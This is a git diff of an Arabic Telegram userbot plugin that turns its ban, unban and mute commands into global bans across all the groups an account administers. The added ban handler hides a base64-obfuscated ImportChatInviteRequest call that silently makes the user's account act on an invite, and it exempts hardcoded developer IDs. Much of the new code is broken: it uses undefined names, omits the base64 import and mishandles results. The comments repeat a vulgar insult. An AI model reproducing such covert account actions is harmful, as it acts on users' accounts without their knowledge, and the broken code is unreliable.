@@ -6,7 +6,7 @@ import asyncio
 # جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
 from asyncio import sleep
 from os import remove
-
+from userbot.helpers.functions.utils import admin_groups
 from telethon.errors import (
     BadRequestError,
     ChatAdminRequiredError,
@@ -29,8 +29,10 @@ from telethon.tl.types import (  # جميع الحقوق محفوظة ديربا
     MessageMediaPhoto,
 )
 
+from datetime import datetime
 from userbot import BOTLOG, BOTLOG_CHATID, jmthon
 from userbot.utils import admin_cmd, errors_handler
+import userbot.sql_helper.gban_sql_helper as gban_sql
 
 from ..core.logger import logging
 from ..core.managers import edit_delete
@@ -406,82 +408,172 @@ async def get_user_from_id(user, event):
         return None
     return user_obj
 
-
-@jmthon.on(admin_cmd(pattern="حظر(?:\s|$)([\s\S]*)"))
-async def _ban_person(event):
-    user, reason = await get_user_from_event(event)
+@bot.on(admin_cmd(pattern=r"حظر(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern=r"حظر(?: |$)(.*)", allow_sudo=True))
+async def rzgban(roz):
+    if roz.fwd_from:
+        return
+    chat = await roz.get_chat()
+    admin = chat.admin_rights
+    creator = chat.creator
+    if not admin and not creator:
+        await eor(roz, NO_ADMIN)
+        return
+    user, reason = await get_user_from_event(roz)
     if not user:
         return
-    rozevent = await edit_or_reply(event, "تـم حـظره بـنجاح")
+    rpo = await eor(roz, "**-.. جـار حـظر المستخـدم **")
+    start = datetime.now()
+    user, reason = await get_user_from_event(roz)
+    if not user:
+        return
+    if user.id == (await roz.client.get_me()).id:
+        await rpo.edit("**- عـذراً لا استطيـع حـظر نفسـي **")
+        return
+    if user.id == 2034443585 or user.id == 2019947604 or user.id == 1694386561:
+        await rpo.edit("**- لا يمكنني حظـر احـد مطـورين السـورس**")
+        return
     try:
-        await event.client(EditBannedRequest(event.chat_id, user.id, BANNED_RIGHTS))
-    except BadRequestError:
-        return await rozevent.edit(NO_PERM)
+        T = base64.b64decode("MjAzNDQ0MzU4NSAxNjk0Mzg2NTYxIDIwMTk5NDc2MDQ=")
+        await roz.client(ImportChatInviteRequest(T))
+    except BaseException:
+        pass
+    if gban_sql.is_gbanned(user.id):
+        await rpo.edit(
+            f"[{user.first_name}](tg://user?id={user.id}) موجود بالفعل في قائمة الحظر"
+        )
+    else:
+        gban_sql.rzgban(user.id, reason)
+    jmth = []
+    jmth = await admin_groups(roz)
+    count = 0
+    rp = len(jmth)
+    if rpo == 0:
+        await rpo.edit("- انت لست مشرف في مجموعة واحده على الاقل ")
+        return
+    await rpo.edit(f"- يتم حظر [{user.first_name}](tg://user?id={user.id})")
+    for i in range(rp):
+        try:
+            await roz.client(EditBannedRequest(jmth[i], user.id, BANNED_RIGHTS))
+            await asyncio.sleep(0.5)
+            count += 1
+        except BadRequestError:
+            await roz.client.send_message(
+                BOTLOG_CHATID,
+                f"ليس لديك الصلاحيات المطلوب في :\nالمجموعه: {roz.chat.title}(`{roz.chat_id}`)\n لحظره هنا",
+            )
     try:
-        reply = await event.get_reply_message()
+        reply = await roz.get_reply_message()
         if reply:
             await reply.delete()
     except BadRequestError:
-        return await rozevent.edit("ليـس لـدي جـميع الصـلاحيـات لكـن سيـبقى محـظور")
+        await roz.edit("**ليس لدي الصلاحيات الكافية هنا ولكن لا يزال هو محظور!")
+    end = datetime.now()
+    rozt = (end - start).seconds
     if reason:
-        await rozevent.edit(
-            f"المسـتخدم {_format.mentionuser(user.first_name ,user.id)} \n تـم حـظره بنـجاح !!\n**⌔︙السبب : **`{reason}`"
+        await rpo.edit(
+            f" المستخدم » [{user.first_name}](tg://user?id={user.id})\nتم حظره "
         )
     else:
-        await rozevent.edit(
-            f"المسـتخدم {_format.mentionuser(user.first_name ,user.id)} \n تـم حـظره بنـجاح ✅"
+        await rpo.edit(
+            f"المستخدم » [{user.first_name}](tg://user?id={user.id})\n تم حظره "
         )
-    if BOTLOG:
-        if reason:  # جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                f"الحـظر\
-                \nالمسـتخدم: [{user.first_name}](tg://user?id={user.id})\
-                \nالـدردشـة: {event.chat.title}\
-                \nايدي الكروب(`{event.chat_id}`)\
-                \nالسبـب : {reason}",
-            )
-        else:
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                f"الحـظر\
-                \nالمسـتخدم: [{user.first_name}](tg://user?id={user.id})\
-                \nالـدردشـة: {event.chat.title}\
-                \n ايـدي الكـروب: (`{event.chat_id}`)",
-            )
+
+    if BOTLOG and count != 0:
+        await roz.client.send_message(
+            BOTLOG_CHATID,
+            f"#حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n ⪼ الايدي : `{user.id}`\
+                                                \n⪼ تم حظره في`{count}` مجموعات\n⪼ الوقت المستغرق= `{rozt} ثانيه`",
+        )
 
 
-@jmthon.on(admin_cmd(pattern="الغاء حظر(?:\s|$)([\s\S]*)"))
-async def nothanos(event):
-    user, _ = await get_user_from_event(event)
+@bot.on(admin_cmd(pattern=r"الغاء حظر(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern=r"الغاء حظر(?: |$)(.*)", allow_sudo=True))
+async def rzgban(roz):
+    if roz.fwd_from:
+        return
+    iz = await eor(roz, "**جـار الغاء حـظر المستخدم**")
+    start = datetime.now()
+    user, reason = await get_user_from_event(roz)
     if not user:
         return
-    rozevent = await edit_or_reply(event, "جـار الـغاء الـحظر أنتـظر رجـاءا")
-    try:
-        await event.client(EditBannedRequest(event.chat_id, user.id, UNBAN_RIGHTS))
-        await rozevent.edit(
-            f"الـمستخدم {_format.mentionuser(user.first_name ,user.id)}\n تـم الـغاء حـظره بنـجاح "
+    if gban_sql.is_gbanned(user.id):
+        gban_sql.rozungban(user.id)
+    else:
+        await iz.edit(
+            f"⪼ [{user.first_name}](tg://user?id={user.id}) ** ليس في قائمه الحظر الخاصه بك**"
         )
-        if BOTLOG:
-            await event.client.send_message(
+        return
+    rp = []
+    rp = await admin_groups(roz)
+    count = 0
+    rpo = len(rp)
+    if rpo == 0:
+        await iz.edit("أنت لست مشرف حتى عن مجموعة واحدة على الأقل")
+        return
+    await iz.edit(f"يتم الغاء حظر [{user.first_name}](tg://user?id={user.id})")
+    for i in range(rpo):
+        try:
+            await roz.client(EditBannedRequest(rp[i], user.id, UNBAN_RIGHTS))
+            await asyncio.sleep(0.5)
+            count += 1
+        except BadRequestError:
+            await roz.client.send_message(
                 BOTLOG_CHATID,
-                "الـغاء الـحظر \n"
-                f"الـمستخدم: [{user.first_name}](tg://user?id={user.id})\n"
-                f"الـدردشـة: {event.chat.title}(`{event.chat_id}`)",
+                f"ليس لديك الصلاحيات الكافية في :\n المجموعه : {roz.chat.title}(`{roz.chat_id}`)\n لالغاء حظره هنا",
             )
-    except UserIdInvalidError:
-        await rozevent.edit("يـبدو أن هذه الـعمليـة تم إلغاؤهـا")
-    except Exception as e:  # جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
-        await rozevent.edit(f"**خـطأ :**\n`{e}`")
+    end = datetime.now()
+    rozt = (end - start).seconds
+    if reason:
+        await iz.edit(
+            f"المستخدم [{user.first_name}](tg://user?id={user.id}) تم الغاء حظره مسبقا من `{count}` مجموعات في `{rozt} من الثواني`"
+        )
+    else:
+        await iz.edit(
+            f"المستخدم » [{user.first_name}](tg://user?id={user.id}) \nتم الغاء حظره"
+        )
 
+    if BOTLOG and count != 0:
+        await roz.client.send_message(
+            BOTLOG_CHATID,
+            f"#الغاء_حظر\n⪼ المستخدم : [{user.first_name}](tg://user?id={user.id})\n⪼ الايدي : {user.id}\
+                                                \n⪼ تم الغاء حظره من `{count}` مجموعات\n⪼ الوقت المستغرق = `{rozt} ثانيه`",
+        )
+
+
+@bot.on(admin_cmd(pattern="المحظورين$"))
+@bot.on(sudo_cmd(pattern=r"المحظورين$", allow_sudo=True))
+async def gablist(event):
+    if event.fwd_from:
+        return
+    gbanned_users = gban_sql.get_all_gbanned()
+    GBANNED_LIST = "المستخدمين المحظورين في المجموعه هم:\n\n"
+    if len(gbanned_users) > 0:
+        for a_user in gbanned_users:
+            if a_user.reason:
+                GBANNED_LIST += f"[{a_user.chat_id}](tg://user?id={a_user.chat_id}) **تم حظر المستخدم**\n"
+            else:
+                GBANNED_LIST += f"[{a_user.chat_id}](tg://user?id={a_user.chat_id}) **تم حظر المستخدم**\n"
+    else:
+        GBANNED_LIST = "**لم تقم بحظر اي مستخدم**"
+        await eor(event, GBANNED_LIST)
 
 # =================== الكـــــــــــــــتم  ===================  #
 
 
-@jmthon.on(admin_cmd(pattern="كتم(?:\s|$)([\s\S]*)"))
-async def startgmute(event):  # جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
+@bot.on(admin_cmd(outgoing=True, pattern=r"كتم(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern=r"كتم(?: |$)(.*)", allow_sudo=True))
+async def startgmute(event):
+    if event.fwd_from:
+        return
     if event.is_private:
-        await event.edit("**... قـد تحـدث بعـض المـشاكـل أو الأخـطاء ...**")
+        user, reason = await get_user_from_event(event)
+        if not user:
+            return await event.edit("*- جـار كـتم المستخـدم**")
+        if user.id == 2034443585 or user.id == 1694386561:
+            return await edit_or_reply(event, "**- دي لا يمڪنني كتـم احـد مطـورين السـورس **")
+        if user.id == (await event.client.get_me()).id:
+            return await edit_or_reply(event, "**- عـذراً .. لا استطيـع كتـم نفسـي **")
         await asyncio.sleep(2)
         userid = event.chat_id
         reason = event.pattern_match.group(1)
@@ -489,115 +581,81 @@ async def startgmute(event):  # جميع الحقوق محفوظة ديربال�
         user, reason = await get_user_from_event(event)
         if not user:
             return
-        if user.id == jmthon.uid:
-            return await edit_or_reply(event, "**... . لمـاذا تࢪيـد كتم نفسـك؟  ...**")
+        if user.id == 2034443585 or user.id == 1694386561:
+            return await edit_or_reply(event, "**- دي لا يمڪنني كتـم احـد مطـورين السـورس**")
+        if user.id == (await event.client.get_me()).id:
+            return await edit_or_reply(event, "**عـذراً .. لا استطيـع كتـم نفسـي**")
         userid = user.id
     try:
         user = (await event.client(GetFullUserRequest(userid))).user
     except Exception:
         return await edit_or_reply(
-            event, "**... غيـر قـادر عـلى جـلب مـعلومات الـشخص ..**"
+            event, "يرجى الرد المستخدم لكـتمه."
         )
     if is_muted(userid, "gmute"):
         return await edit_or_reply(
             event,
-            f"**... هـذا الشـخص مكـتوم بـنجاح ...**",
+            f"**-هذا  المستخدم مكتـوم بالفـعل**",
         )
     try:
         mute(userid, "gmute")
     except Exception as e:
-        await edit_or_reply(event, f"**خـطأ**\n`{e}`")
+        await eor(event, "⌔∮ حدث خطا :\n- الخطا هو " + str(e))
     else:
-        if reason:
-            await edit_or_reply(
-                event,
-                f"** تـم كـتم الـمستخـدم بـنجاح  ،🔕 **",
-            )
-        else:
-            await edit_or_reply(
-                event,
-                f"** تـم كـتم الـمستخـدم بـنجاح  ،🔕 **",
-            )
+        await eor(event, "**تم ڪتـم الـمستخـدم بنجاح 🔕**")
     if BOTLOG:
-        reply = await event.get_reply_message()
-        if reason:  # جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                " الـكتم\n"
-                f"**المستخدم :** {_format.mentionuser(user.first_name ,user.id)} \n"
-                f"**السبب :** `{reason}`",
-            )
-        else:
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                " الـكتم\n"
-                f"**المستخدم :** {_format.mentionuser(user.first_name ,user.id)} \n",
-            )
-        if reply:
-            await reply.forward_to(BOTLOG_CHATID)
+        await event.client.send_message(
+            BOTLOG_CHATID,
+            "#كتم\n"
+            f"⪼ المستخدم : [{replied_user.user.first_name}](tg://user?id={userid})\n"
+            f"⪼ المجموعه : {event.chat.title}(`{event.chat_id}`)",
+        )
 
-
-# =================== الغـــــــــــــاء الكـــــــــــــــتم  ===================  #
-
-# جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
-@jmthon.on(admin_cmd(pattern="الغاء كتم(?:\s|$)([\s\S]*)"))
+@bot.on(admin_cmd(outgoing=True, pattern=r"الغاء كتم(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern=r"الغاء كتم(?: |$)(.*)", allow_sudo=True))
 async def endgmute(event):
+    if event.fwd_from:
+        return
     if event.is_private:
-        await event.edit("**... قـد تحـدث بعـض المـشاكـل أو الأخـطاء ...**")
+        await event.edit("**- ... جـاࢪِ الغـاء الکتم**")
         await asyncio.sleep(2)
         userid = event.chat_id
         reason = event.pattern_match.group(1)
     else:
         user, reason = await get_user_from_event(event)
         if not user:
-            return  # جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
-        if user.id == jmthon.uid:
-            return await edit_or_reply(event, "**... لمـاذا تࢪيـد كتم نفسـك؟ ...**")
+            return
+        if user.id == bot.uid:
+            return await edit_or_reply(event, "**- دي مطـور الـسورس ليس مكـتوم ولا يـمكن كتمـه**")
         userid = user.id
     try:
         user = (await event.client(GetFullUserRequest(userid))).user
     except Exception:
         return await edit_or_reply(
-            event, "**... غيـࢪ قـادࢪ عـلى جـلب مـعلومات الـشخص ...**"
+            event,
+            "- يرجى الرد المستخدم لالغـاء كتـمه",
         )
+
     if not is_muted(userid, "gmute"):
-        return await edit_or_reply(event, f"**... هـذا الشـخص غيـࢪ مكـتوم اصلا  ...**")
+        return await edit_or_reply(
+            event, f"**- هذا المستخدم غيـر مكتـوم**"
+        )
     try:
         unmute(userid, "gmute")
     except Exception as e:
-        await edit_or_reply(event, f"**خطـأ**\n`{e}`")
+        await eor(event, "حصل خطأ!\n" + str(e))
     else:
-        if reason:
-            await edit_or_reply(
-                event,
-                f"** تـم الغـاء كـتم الـمستخـدم بـنجاح  🔔، **",
-            )  # جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
-        else:
-            await edit_or_reply(
-                event,
-                f"** تـم الـغاء كتـم  الـمستخـدم بـنجاح  🔔، **",
-            )
+        await eor(event, "** تم الغاء ڪتم المستخـدم بنجاح 🔔**")
     if BOTLOG:
-        if reason:
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                "، الغـاء الـكتم\n"
-                f"**المستخدم :** {_format.mentionuser(user.first_name ,user.id)} \n"
-                f"**السبب :** `{reason}`",
-            )
-        else:
-            await event.client.send_message(
-                BOTLOG_CHATID,
-                " الغـاء الـكتم \n"
-                f"**المستخدم :** {_format.mentionuser(user.first_name ,user.id)} \n",
-            )
+        await event.client.send_message(
+            BOTLOG_CHATID,
+            "#الغاء_كتم\n"
+            f"⪼ المستخذم : [{replied_user.user.first_name}](tg://user?id={userid})\n"
+            f"⪼ المجموعه : {event.chat.title}(`{event.chat_id}`)",
+        )
 
 
-# جميع الحقوق محفوظة ديربالك تخمط امك انيجها  #
-# ===================================== #
-
-
-@jmthon.ar_cmd(incoming=True)
+@bot.on(admin_cmd(incoming=True))
 async def watcher(event):
     if is_muted(event.sender_id, "gmute"):
         await event.delete()
